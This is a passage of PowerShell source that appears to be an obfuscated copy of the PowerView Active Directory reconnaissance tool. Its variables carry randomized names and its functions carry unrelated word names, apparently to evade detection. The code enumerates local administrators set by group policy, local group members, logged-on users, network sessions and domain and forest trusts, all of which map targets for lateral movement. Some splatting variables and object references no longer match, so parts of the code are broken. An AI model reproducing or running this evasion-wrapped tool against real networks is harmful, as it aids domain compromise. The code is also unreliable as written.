        }
        $Inf = pang @ParseArgs
        if($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
            $dgCbTxmI99 = @{}
            ForEach ($QJDDnjSo99 in $Inf.'Group Membership'.GetEnumerator()) {
                $Group, $ORXIsRgx99 = $QJDDnjSo99.Key.Split('__', $bIkdXHCT99) | ForEach-Object {$_.Trim()}
                $kNZDgfxj99 = $QJDDnjSo99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                if($qtLxhOJJ99) {
                    $JdVNujfS99 = @()
                    ForEach($NjgAftjW99 in $kNZDgfxj99) {
                        if($NjgAftjW99 -and ($NjgAftjW99.Trim() -ne '')) {
                            if($NjgAftjW99 -notmatch '^S-1-.*') {
                                $sKmlqiRe99 = Convert-NameToSid -qgkPCptv99 $qgkPCptv99 -QdVkYekP99 $NjgAftjW99 | Select-Object -ExpandProperty SID
                                if($sKmlqiRe99) {
                                    $JdVNujfS99 += $sKmlqiRe99
                                }
                                else {
                                    $JdVNujfS99 += $NjgAftjW99
                                }
                            }
                            else {
                                $JdVNujfS99 += $NjgAftjW99
                            }
                        }
                    }
                    $kNZDgfxj99 = $JdVNujfS99
                }
                if(-not $dgCbTxmI99[$Group]) {
                    $dgCbTxmI99[$Group] = @{}
                }
                if($kNZDgfxj99 -isnot [System.Array]) {$kNZDgfxj99 = @($kNZDgfxj99)}
                $dgCbTxmI99[$Group].Add($ORXIsRgx99, $kNZDgfxj99)
            }
            ForEach ($QJDDnjSo99 in $dgCbTxmI99.GetEnumerator()) {
                if($QJDDnjSo99 -and $QJDDnjSo99.Key -and ($QJDDnjSo99.Key -match '^\*')) {
                    $CPutuZOY99 = $QJDDnjSo99.Key.Trim('*')
                    if($CPutuZOY99 -and ($CPutuZOY99.Trim() -ne '')) {
                        $xJcFzwjB99 = Convert-SidToName -SID $CPutuZOY99
                    }
                    else {
                        $xJcFzwjB99 = $False
                    }
                }
                else {
                    $xJcFzwjB99 = $QJDDnjSo99.Key
                    if($xJcFzwjB99 -and ($xJcFzwjB99.Trim() -ne '')) {
                        if($xJcFzwjB99 -match 'Administrators') {
                            $CPutuZOY99 = 'S-1-5-32-544'
                        }
                        elseif($xJcFzwjB99 -match 'Remote Desktop') {
                            $CPutuZOY99 = 'S-1-5-32-555'
                        }
                        elseif($xJcFzwjB99 -match 'Guests') {
                            $CPutuZOY99 = 'S-1-5-32-546'
                        }
                        elseif($xJcFzwjB99.Trim() -ne '') {
                            $CPutuZOY99 = Convert-NameToSid -qgkPCptv99 $qgkPCptv99 -QdVkYekP99 $xJcFzwjB99 | Select-Object -ExpandProperty SID
                        }
                        else {
                            $CPutuZOY99 = $Null
                        }
                    }
                }
                $mODZaCns99 = New-Object PSObject
                $mODZaCns99 | Add-Member Noteproperty 'GPODisplayName' $vMRQTzlJ99
                $mODZaCns99 | Add-Member Noteproperty 'GPOName' $tassEbfi99
                $mODZaCns99 | Add-Member Noteproperty 'GPOPath' $iZBfjNKO99
                $mODZaCns99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                $mODZaCns99 | Add-Member Noteproperty 'Filters' $Null
                $mODZaCns99 | Add-Member Noteproperty 'GroupName' $xJcFzwjB99
                $mODZaCns99 | Add-Member Noteproperty 'GroupSID' $CPutuZOY99
                $mODZaCns99 | Add-Member Noteproperty 'GroupMemberOf' $QJDDnjSo99.Value.Memberof
                $mODZaCns99 | Add-Member Noteproperty 'GroupMembers' $QJDDnjSo99.Value.Members
                $mODZaCns99
            }
        }
        $uTSPHzqh99 =  @{
            'GroupsXMLpath' = "$iZBfjNKO99\MACHINE\Preferences\Groups\Groups.xml"
            'UsePSDrive' = $vTZrtbFr99
        }
        Myers @ParseArgs | ForEach-Object {
            if($qtLxhOJJ99) {
                $JdVNujfS99 = @()
                ForEach($NjgAftjW99 in $_.GroupMembers) {
                    if($NjgAftjW99 -and ($NjgAftjW99.Trim() -ne '')) {
                        if($NjgAftjW99 -notmatch '^S-1-.*') {
                            $sKmlqiRe99 = Convert-NameToSid -qgkPCptv99 $qgkPCptv99 -QdVkYekP99 $NjgAftjW99 | Select-Object -ExpandProperty SID
                            if($sKmlqiRe99) {
                                $JdVNujfS99 += $sKmlqiRe99
                            }
                            else {
                                $JdVNujfS99 += $NjgAftjW99
                            }
                        }
                        else {
                            $JdVNujfS99 += $NjgAftjW99
                        }
                    }
                }
                $_.GroupMembers = $JdVNujfS99
            }
            $_ | Add-Member Noteproperty 'GPODisplayName' $vMRQTzlJ99
            $_ | Add-Member Noteproperty 'GPOName' $tassEbfi99
            $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
            $_
        }
    }
}
function taillights {
    [CmdletBinding()]
    Param (
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $ODxapxFQ99 = 'Administrators',
        [Switch]
        $vTZrtbFr99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200
    )
    $WrquSjZK99 = @('*')
    if($ODxapxFQ99 -like "*Admin*") {
        $VCQEnxku99 = 'S-1-5-32-544'
    }
    elseif ( ($ODxapxFQ99 -like "*RDP*") -or ($ODxapxFQ99 -like "*Remote*") ) {
        $VCQEnxku99 = 'S-1-5-32-555'
    }
    elseif ($ODxapxFQ99 -like "S-1-5-*") {
        $VCQEnxku99 = $ODxapxFQ99
    }
    else {
        throw "LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' SID format."
    }
    if(-not $WrquSjZK99) {
        throw "No effective target SIDs!"
    }
    Write-Verbose "TargetLocalSID: $VCQEnxku99"
    Write-Verbose "Effective target SIDs: $WrquSjZK99"
    $uMhIZeNp99 =  @{
        'Domain' = $qgkPCptv99
        'DomainController' = $wjlQGPFM99
        'UsePSDrive' = $vTZrtbFr99
        'ResolveMemberSIDs' = $True
        'PageSize' = $XHaombgH99
    }
    Sort-Object -Property GPOName -Unique -InputObject $(ForEach($mODZaCns99 in (precursors @GPOGroupArgs)) {
        if($mODZaCns99.GroupSID -match $VCQEnxku99) {
            ForEach($nZejQsfZ99 in $mODZaCns99.GroupMembers) {
                if($nZejQsfZ99) {
                    if ( ($WrquSjZK99[0] -eq '*') -or ($WrquSjZK99 -Contains $nZejQsfZ99) ) {
                        $mODZaCns99
                    }
                }
            }
        }
        if( ($mODZaCns99.GroupMemberOf -contains $VCQEnxku99) ) {
            if( ($WrquSjZK99[0] -eq '*') -or ($WrquSjZK99 -Contains $mODZaCns99.GroupSID) ) {
                $mODZaCns99
            }
        }
    }) | ForEach-Object {
        $tassEbfi99 = $_.GPODisplayName
        write-verbose "GPOname: $tassEbfi99"
        $BxVGwCzA99 = $_.GPOName
        $iZBfjNKO99 = $_.GPOPath
        $EILHaUsj99 = $_.GPOType
        if($_.GroupMembers) {
            $XfOymQIJ99 = $_.GroupMembers
        }
        else {
            $XfOymQIJ99 = $_.GroupSID
        }
        $EcDVMnLK99 = $_.Filters
        if(-not $qvfjLlkX99) {
            $OHwMcVRJ99 = $XfOymQIJ99
        }
        else {
            $OHwMcVRJ99 = $qvfjLlkX99
        }
        offertory -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -GUID $BxVGwCzA99 -HUSHunWS99 -XHaombgH99 $XHaombgH99 | ForEach-Object {
            if($EcDVMnLK99) {
                $aROYgvgT99 = $EcDVMnLK99.Value
                $UdtvWyCb99 = ForEach($PsHluYlO99 in (lea -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $_.ADSpath -XHaombgH99 $XHaombgH99)) {
                    if($PsHluYlO99.ToLower() -match $EcDVMnLK99.Value) {
                        $PsHluYlO99
                    }
                }
            }
            else {
                $UdtvWyCb99 = lea -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -CDwHFsqK99 $_.ADSpath -XHaombgH99 $XHaombgH99
            }
            if($UdtvWyCb99) {
                if($UdtvWyCb99 -isnot [System.Array]) {$UdtvWyCb99 = @($UdtvWyCb99)}
                ForEach ($AnHETZAh99 in $OHwMcVRJ99) {
                    $Object = hyena -SID $AnHETZAh99
                    if (-not $Object) {
                        $Object = hyena -SID $AnHETZAh99 -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -XHaombgH99 $XHaombgH99
                    }
                    if($Object) {
                        $jHgnZMWO99 = $Object.distinguishedName
                        $RGaQlTIC99 = $jHgnZMWO99.subString($jHgnZMWO99.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        $PuvtWQbE99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $JYIZvNiN99 = New-Object PSObject
                        $JYIZvNiN99 | Add-Member Noteproperty 'ObjectDomain' $RGaQlTIC99
                        $JYIZvNiN99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $JYIZvNiN99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $JYIZvNiN99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $JYIZvNiN99 | Add-Member Noteproperty 'IsGroup' $PuvtWQbE99
                        $JYIZvNiN99 | Add-Member Noteproperty 'GPODomain' $qgkPCptv99
                        $JYIZvNiN99 | Add-Member Noteproperty 'GPODisplayName' $tassEbfi99
                        $JYIZvNiN99 | Add-Member Noteproperty 'GPOGuid' $BxVGwCzA99
                        $JYIZvNiN99 | Add-Member Noteproperty 'GPOPath' $iZBfjNKO99
                        $JYIZvNiN99 | Add-Member Noteproperty 'GPOType' $EILHaUsj99
                        $JYIZvNiN99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                        $JYIZvNiN99 | Add-Member Noteproperty 'ComputerName' $UdtvWyCb99
                        $JYIZvNiN99.PSObject.TypeNames.Add('PowerView.GPOLocalGroup')
                        $JYIZvNiN99
                    }
                }
            }
        }
        climates -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -GUID $BxVGwCzA99 -XHaombgH99 $XHaombgH99 -HUSHunWS99 | ForEach-Object {
            ForEach ($AnHETZAh99 in $OHwMcVRJ99) {
                $Object = hyena -SID $AnHETZAh99
                if (-not $Object) {
                    $Object = hyena -SID $AnHETZAh99 -qgkPCptv99 $qgkPCptv99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -XHaombgH99 $XHaombgH99                        
                }
                if($Object) {
                    $jHgnZMWO99 = $Object.distinguishedName
                    $RGaQlTIC99 = $jHgnZMWO99.subString($jHgnZMWO99.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                    $PuvtWQbE99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $jYTNwJla99 = New-Object PSObject
                    $JYIZvNiN99 | Add-Member Noteproperty 'ObjectDomain' $RGaQlTIC99
                    $jYTNwJla99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $jYTNwJla99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $jYTNwJla99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $jYTNwJla99 | Add-Member Noteproperty 'IsGroup' $PuvtWQbE99
                    $jYTNwJla99 | Add-Member Noteproperty 'GPODomain' $qgkPCptv99
                    $jYTNwJla99 | Add-Member Noteproperty 'GPODisplayName' $tassEbfi99
                    $jYTNwJla99 | Add-Member Noteproperty 'GPOGuid' $BxVGwCzA99
                    $jYTNwJla99 | Add-Member Noteproperty 'GPOPath' $iZBfjNKO99
                    $jYTNwJla99 | Add-Member Noteproperty 'GPOType' $EILHaUsj99
                    $jYTNwJla99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $jYTNwJla99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $jYTNwJla99.PSObject.TypeNames.Add('PowerView.GPOLocalGroup')
                    $jYTNwJla99
                }
            }
        }
    }
}
function Somalia {
    [CmdletBinding(DefaultParameterSetName = 'WinNT')]
    param(
        [Parameter(ParameterSetName = 'API', Position=0, ValueFromPipeline=$True)]
        [Parameter(ParameterSetName = 'WinNT', Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String[]]
        $FSUaYgqW99 = $Env:ComputerName,
        [Parameter(ParameterSetName = 'WinNT')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $YmTdfiSu99,
        [Parameter(ParameterSetName = 'WinNT')]
        [Parameter(ParameterSetName = 'API')]
        [String]
        $xJcFzwjB99 = 'Administrators',
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Switch]
        $DbAVTovZ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $pRsTGpGl99
    )
    process {
        $fOLGAsJa99 = @()
        if($YmTdfiSu99) {
            $fOLGAsJa99 = Get-Content -Path $YmTdfiSu99
        }
        else {
            $fOLGAsJa99 += $FSUaYgqW99 | Get-NameField
        }
        ForEach($gZxLEckx99 in $fOLGAsJa99) {
            if($API) {
                $NnxSEDfD99 = 2
                $LVGblfaa99 = [IntPtr]::Zero
                $KQtgIocq99 = 0
                $YMcnFSch99 = 0
                $UjOfQVBV99 = 0
                $KxpZQgcr99 = $xLwRIgua99::NetLocalGroupGetMembers($gZxLEckx99, $xJcFzwjB99, $NnxSEDfD99, [ref]$LVGblfaa99, -1, [ref]$KQtgIocq99, [ref]$YMcnFSch99, [ref]$UjOfQVBV99)
                $vBrKvGZT99 = $LVGblfaa99.ToInt64()
                $lhYrDuuX99 = @()
                if (($KxpZQgcr99 -eq 0) -and ($vBrKvGZT99 -gt 0)) {
                    $LdEczNyz99 = $nBpBZvrp99::GetSize()
                    for ($i = 0; ($i -lt $KQtgIocq99); $i++) {
                        $CJtEMYyN99 = New-Object System.Intptr -ArgumentList $vBrKvGZT99
                        $Info = $CJtEMYyN99 -as $nBpBZvrp99
                        $vBrKvGZT99 = $CJtEMYyN99.ToInt64()
                        $vBrKvGZT99 += $LdEczNyz99
                        $CerFrfFT99 = ''
                        $VbYIcSEO99 = $dEEPHqLA99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$CerFrfFT99);$GFAvwSLM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if($VbYIcSEO99 -eq 0) {
                        }
                        else {
                            $PuvtWQbE99 = $($Info.lgrmi2_sidusage -ne 'SidTypeUser')
                            $lhYrDuuX99 += @{
                                'ComputerName' = $gZxLEckx99
                                'AccountName' = $Info.lgrmi2_domainandname
                                'SID' = $CerFrfFT99
                                'IsGroup' = $PuvtWQbE99
                                'Type' = 'LocalUser'
                            }
                        }
                    }
                    $Null = $xLwRIgua99::NetApiBufferFree($LVGblfaa99)
                    $NLfsvvgV99 = ($lhYrDuuX99 | Where-Object {$_['SID'] -like '*-500'})['SID']
                    $NLfsvvgV99 = $NLfsvvgV99.Substring(0, $NLfsvvgV99.LastIndexOf('-'))
                    try {
                        ForEach($UBNESasi99 in $lhYrDuuX99) {
                            if($pRsTGpGl99 -and ($UBNESasi99['SID'] -match $pRsTGpGl99)) {
                                $UBNESasi99['IsDomain'] = $True
                            }
                            elseif($UBNESasi99['SID'] -match $NLfsvvgV99) {
                                $UBNESasi99['IsDomain'] = $False
                            }
                            else {
                                $UBNESasi99['IsDomain'] = $True
                            }
                            if($DbAVTovZ99) {
                                if($UBNESasi99['IsDomain']) {
                                    $UBNESasi99
                                }
                            }
                            else {
                                $UBNESasi99
                            }
                        }
                    }
                    catch { }
                }
                else {
                }
            }
            else {
                try {
                    $lhYrDuuX99 = @()
                    $noyaIGxx99 = @($([ADSI]"WinNT://$gZxLEckx99/$xJcFzwjB99,group").psbase.Invoke('Members'))
                    $noyaIGxx99 | ForEach-Object {
                        $UBNESasi99 = ([ADSI]$_)
                        $CDwHFsqK99 = $UBNESasi99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        if(([regex]::Matches($CDwHFsqK99, '/')).count -eq 1) {
                            $kkUNVIuD99 = $True
                            $Name = $CDwHFsqK99.Replace('/', '\')
                        }
                        else {
                            $kkUNVIuD99 = $False
                            $Name = $CDwHFsqK99.Substring($CDwHFsqK99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $PuvtWQbE99 = ($UBNESasi99.SchemaClassName -like 'group')
                        if($DbAVTovZ99) {
                            if($kkUNVIuD99) {
                                $lhYrDuuX99 += @{
                                    'ComputerName' = $gZxLEckx99
                                    'AccountName' = $Name
                                    'SID' = ((New-Object System.Security.Principal.SecurityIdentifier($UBNESasi99.InvokeGet('ObjectSID'),0)).Value)
                                    'IsGroup' = $PuvtWQbE99
                                    'IsDomain' = $kkUNVIuD99
                                    'Type' = 'LocalUser'
                                }
                            }
                        }
                        else {
                            $lhYrDuuX99 += @{
                                'ComputerName' = $gZxLEckx99
                                'AccountName' = $Name
                                'SID' = ((New-Object System.Security.Principal.SecurityIdentifier($UBNESasi99.InvokeGet('ObjectSID'),0)).Value)
                                'IsGroup' = $PuvtWQbE99
                                'IsDomain' = $kkUNVIuD99
                                'Type' = 'LocalUser'
                            }
                        }
                    }
                    $lhYrDuuX99
                }
                catch {
                    Write-Verbose "Somalia error for $gZxLEckx99 : $_"
                }
            }
        }
    }
}
filter Get-NetLoggedon {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $FSUaYgqW99 = 'localhost'
    )
    $cAqMfgab99 = $FSUaYgqW99 | Get-NameField
    $NnxSEDfD99 = 1
    $LVGblfaa99 = [IntPtr]::Zero
    $KQtgIocq99 = 0
    $YMcnFSch99 = 0
    $UjOfQVBV99 = 0
    $KxpZQgcr99 = $xLwRIgua99::NetWkstaUserEnum($cAqMfgab99, $NnxSEDfD99, [ref]$LVGblfaa99, -1, [ref]$KQtgIocq99, [ref]$YMcnFSch99, [ref]$UjOfQVBV99)
    $vBrKvGZT99 = $LVGblfaa99.ToInt64()
    if (($KxpZQgcr99 -eq 0) -and ($vBrKvGZT99 -gt 0)) {
        $LdEczNyz99 = $JEyXbLas99::GetSize()
        for ($i = 0; ($i -lt $KQtgIocq99); $i++) {
            $CJtEMYyN99 = New-Object System.Intptr -ArgumentList $vBrKvGZT99
            $Info = $CJtEMYyN99 -as $JEyXbLas99
            $kpWTrolA99 = $Info | Select-Object *
            $kpWTrolA99 | Add-Member Noteproperty 'ComputerName' $cAqMfgab99
            $vBrKvGZT99 = $CJtEMYyN99.ToInt64()
            $vBrKvGZT99 += $LdEczNyz99
            $kpWTrolA99
        }
        $Null = $xLwRIgua99::NetApiBufferFree($LVGblfaa99)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $KxpZQgcr99).Message)"
    }
}
filter Get-NetSession {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $FSUaYgqW99 = 'localhost',
        [String]
        $QEbKYtQz99 = ''
    )
    $cAqMfgab99 = $FSUaYgqW99 | Get-NameField
    $NnxSEDfD99 = 10
    $LVGblfaa99 = [IntPtr]::Zero
    $KQtgIocq99 = 0
    $YMcnFSch99 = 0
    $UjOfQVBV99 = 0
    $KxpZQgcr99 = $xLwRIgua99::NetSessionEnum($cAqMfgab99, '', $QEbKYtQz99, $NnxSEDfD99, [ref]$LVGblfaa99, -1, [ref]$KQtgIocq99, [ref]$YMcnFSch99, [ref]$UjOfQVBV99)
    $vBrKvGZT99 = $LVGblfaa99.ToInt64()
    if (($KxpZQgcr99 -eq 0) -and ($vBrKvGZT99 -gt 0)) {
        $LdEczNyz99 = $zQxgyCSB99::GetSize()
        for ($i = 0; ($i -lt $KQtgIocq99); $i++) {
            $CJtEMYyN99 = New-Object System.Intptr -ArgumentList $vBrKvGZT99
            $Info = $CJtEMYyN99 -as $zQxgyCSB99
            $SFCiSsJh99 = $Info | Select-Object *
            $SFCiSsJh99 | Add-Member Noteproperty 'ComputerName' $cAqMfgab99
            $vBrKvGZT99 = $CJtEMYyN99.ToInt64()
            $vBrKvGZT99 += $LdEczNyz99
            $SFCiSsJh99
        }
        $Null = $xLwRIgua99::NetApiBufferFree($LVGblfaa99)
    }
    else {
        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $KxpZQgcr99).Message)"
    }
}
filter Get-LoggedOnLocal {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $FSUaYgqW99 = 'localhost'
    )
    $FSUaYgqW99 = Get-NameField -Object $FSUaYgqW99
    try {
        $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$FSUaYgqW99")
        $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
            $QEbKYtQz99 = Convert-SidToName $_
            $Parts = $QEbKYtQz99.Split('\')
            $VqGWUmua99 = $Null
            $QEbKYtQz99 = $Parts[-1]
            if ($Parts.Length -eq 2) {
                $VqGWUmua99 = $Parts[0]
            }
            $sIICdTUW99 = New-Object PSObject
            $sIICdTUW99 | Add-Member Noteproperty 'ComputerName' "$FSUaYgqW99"
            $sIICdTUW99 | Add-Member Noteproperty 'UserDomain' $VqGWUmua99
            $sIICdTUW99 | Add-Member Noteproperty 'UserName' $QEbKYtQz99
            $sIICdTUW99 | Add-Member Noteproperty 'UserSID' $_
            $sIICdTUW99
        }
    }
    catch { }
}
function vandalized {
    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        $CDwHFsqK99,
        [Switch]
        $API,
        [Switch]
        $LDAP,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    begin {
        $NtHpyoSt99 = @{
            [uint32]'0x00000001' = 'non_transitive'
            [uint32]'0x00000002' = 'uplevel_only'
            [uint32]'0x00000004' = 'quarantined_domain'
            [uint32]'0x00000008' = 'forest_transitive'
            [uint32]'0x00000010' = 'cross_organization'
            [uint32]'0x00000020' = 'within_forest'
            [uint32]'0x00000040' = 'treat_as_external'
            [uint32]'0x00000080' = 'trust_uses_rc4_encryption'
            [uint32]'0x00000100' = 'trust_uses_aes_keys'
            [uint32]'0x00000200' = 'cross_organization_no_tgt_delegation'
            [uint32]'0x00000400' = 'pim_trust'
        }
    }
    process {
        if(-not $qgkPCptv99) {
            $RPNizsdw99 = (Get-NetDomain -elChyFUc99 $elChyFUc99).Name
        }
        else {
            $RPNizsdw99 = $qgkPCptv99
        }
        if($LDAP -or $CDwHFsqK99) {
            $quidfjfc99 = Get-DomainSearcher -qgkPCptv99 $RPNizsdw99 -wjlQGPFM99 $wjlQGPFM99 -elChyFUc99 $elChyFUc99 -XHaombgH99 $XHaombgH99 -CDwHFsqK99 $CDwHFsqK99
            $YAOczpzb99 = cloudless -qgkPCptv99 $RPNizsdw99 -wjlQGPFM99 $wjlQGPFM99
            if($quidfjfc99) {
                $quidfjfc99.Filter = '(objectClass=trustedDomain)'
                $WrHBfuOI99 = $quidfjfc99.FindAll()
                $WrHBfuOI99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $ixZApJxZ99 = New-Object PSObject
                    $qyqLGASt99 = @()
                    $qyqLGASt99 += $NtHpyoSt99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $NtHpyoSt99[$_] }
                    $xBvvytBZ99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $nuEkcQjX99 = New-Object Guid @(,$Props.objectguid[0])
                    $AnHETZAh99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $ixZApJxZ99 | Add-Member Noteproperty 'SourceName' $RPNizsdw99
                    $ixZApJxZ99 | Add-Member Noteproperty 'SourceSID' $YAOczpzb99
                    $ixZApJxZ99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $ixZApJxZ99 | Add-Member Noteproperty 'TargetSID' $AnHETZAh99
                    $ixZApJxZ99 | Add-Member Noteproperty 'ObjectGuid' "{$nuEkcQjX99}"
                    $ixZApJxZ99 | Add-Member Noteproperty 'TrustType' $($qyqLGASt99 -join ',')
                    $ixZApJxZ99 | Add-Member Noteproperty 'TrustDirection' "$xBvvytBZ99"
                    $ixZApJxZ99.PSObject.TypeNames.Add('PowerView.DomainTrustLDAP')
                    $ixZApJxZ99
                }
                $WrHBfuOI99.dispose()
                $quidfjfc99.dispose()
            }
        }
        elseif($API) {
            if(-not $wjlQGPFM99) {
                $wjlQGPFM99 = Get-NetDomainController -elChyFUc99 $elChyFUc99 -qgkPCptv99 $RPNizsdw99 | Select-Object -First 1 | Select-Object -ExpandProperty Name
            }
            if($wjlQGPFM99) {
                $LVGblfaa99 = [IntPtr]::Zero
                $Flags = 63
                $pmBcuILf99 = 0
                $KxpZQgcr99 = $xLwRIgua99::DsEnumerateDomainTrusts($wjlQGPFM99, $Flags, [ref]$LVGblfaa99, [ref]$pmBcuILf99)
                $vBrKvGZT99 = $LVGblfaa99.ToInt64()
                if (($KxpZQgcr99 -eq 0) -and ($vBrKvGZT99 -gt 0)) {
                    $LdEczNyz99 = $CVZqaIGQ99::GetSize()
                    for ($i = 0; ($i -lt $pmBcuILf99); $i++) {
                        $CJtEMYyN99 = New-Object System.Intptr -ArgumentList $vBrKvGZT99
                        $Info = $CJtEMYyN99 -as $CVZqaIGQ99
                        $vBrKvGZT99 = $CJtEMYyN99.ToInt64()
                        $vBrKvGZT99 += $LdEczNyz99
                        $CerFrfFT99 = ""
                        $KxpZQgcr99 = $dEEPHqLA99::ConvertSidToStringSid($Info.DomainSid, [ref]$CerFrfFT99);$GFAvwSLM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if($KxpZQgcr99 -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $GFAvwSLM99).Message)"
                        }
                        else {
                            $ixZApJxZ99 = New-Object PSObject
                            $ixZApJxZ99 | Add-Member Noteproperty 'SourceDomain' $RPNizsdw99
                            $ixZApJxZ99 | Add-Member Noteproperty 'SourceDomainController' $wjlQGPFM99
                            $ixZApJxZ99 | Add-Member Noteproperty 'NetbiosDomainName' $Info.NetbiosDomainName
                            $ixZApJxZ99 | Add-Member Noteproperty 'DnsDomainName' $Info.DnsDomainName
                            $ixZApJxZ99 | Add-Member Noteproperty 'Flags' $Info.Flags
                            $ixZApJxZ99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                            $ixZApJxZ99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                            $ixZApJxZ99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                            $ixZApJxZ99 | Add-Member Noteproperty 'DomainSid' $CerFrfFT99
                            $ixZApJxZ99 | Add-Member Noteproperty 'DomainGuid' $Info.DomainGuid
                            $ixZApJxZ99.PSObject.TypeNames.Add('PowerView.APIDomainTrust')
                            $ixZApJxZ99
                        }
                    }
                    $Null = $xLwRIgua99::NetApiBufferFree($LVGblfaa99)
                }
                else {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $KxpZQgcr99).Message)"
                }
            }
            else {
                Write-Verbose "Could not retrieve domain controller for $qgkPCptv99"
            }
        }
        else {
            $VxTriHrh99 = Get-NetDomain -qgkPCptv99 $qgkPCptv99 -elChyFUc99 $elChyFUc99
            if($VxTriHrh99) {
                $VxTriHrh99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Add('PowerView.DomainTrust')
                    $_
                }
            }
        }
    }
}
function sailfishes {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $CsVkrBsu99,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    process {
        $qzNRrKiH99 = Get-NetForest -CsVkrBsu99 $CsVkrBsu99 -elChyFUc99 $elChyFUc99
        if($qzNRrKiH99) {
            $qzNRrKiH99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Add('PowerView.ForestTrust')
                $_
            }
        }
    }
}
function granularity {
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,
        [String]
        $wjlQGPFM99,
        [ValidateRange(1,10000)]
        [Int]
        $XHaombgH99 = 200,
        [Management.Automation.PSCredential]
        $elChyFUc99
    )
    $vRRBwRsS99 = @{}
    $cYmucUIu99 = New-Object System.Collections.Stack
    $apiqPZCl99 = (Get-NetDomain -elChyFUc99 $elChyFUc99).Name
    $cYmucUIu99.push($apiqPZCl99)
    while($cYmucUIu99.Count -ne 0) {
        $qgkPCptv99 = $cYmucUIu99.Pop()
        if ($qgkPCptv99 -and ($qgkPCptv99.Trim() -ne "") -and (-not $vRRBwRsS99.ContainsKey($qgkPCptv99))) {
            Write-Verbose "Enumerating trusts for domain '$qgkPCptv99'"
            $Null = $vRRBwRsS99.add($qgkPCptv99, "")
            try {
                if($LDAP -or $wjlQGPFM99) {
                    $CmjkJYGw99 = vandalized -qgkPCptv99 $qgkPCptv99 -LDAP -wjlQGPFM99 $wjlQGPFM99 -XHaombgH99 $XHaombgH99 -elChyFUc99 $elChyFUc99
                }
                else {
                    $CmjkJYGw99 = vandalized -qgkPCptv99 $qgkPCptv99 -XHaombgH99 $XHaombgH99 -elChyFUc99 $elChyFUc99
                }
